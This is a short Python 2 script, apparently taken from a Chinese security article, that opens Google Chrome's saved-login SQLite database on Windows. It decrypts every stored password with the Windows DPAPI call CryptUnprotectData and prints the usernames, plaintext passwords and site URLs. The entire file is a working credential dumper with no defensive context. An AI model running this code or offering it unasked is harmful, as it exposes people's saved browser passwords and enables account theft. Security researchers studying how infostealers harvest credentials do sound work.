#coding:utf8  
#reference:http://netsecurity.51cto.com/art/201603/507131.htm

import os, sys  
import sqlite3  
import win32crypt  
 
 
google_path = r'Google\Chrome\User Data\Default\Login Data' 
 
 
db_file_path = os.path.join(os.environ['LOCALAPPDATA'],google_path)  
conn = sqlite3.connect(db_file_path)  
cursor = conn.cursor()  
cursor.execute('select username_value, password_value, signon_realm from logins')  
 
#接收全部返回结果  
for data in cursor.fetchall():  
    passwd = win32crypt.CryptUnprotectData(data[1],None,None,None,0)  
      
    if passwd:  
        print '-------------------------' 
        print u'[+]用户名: ' + data[0]   
        print u'[+]密码: ' + passwd[1]   
        print u'[+]网站URL: ' + data[2]  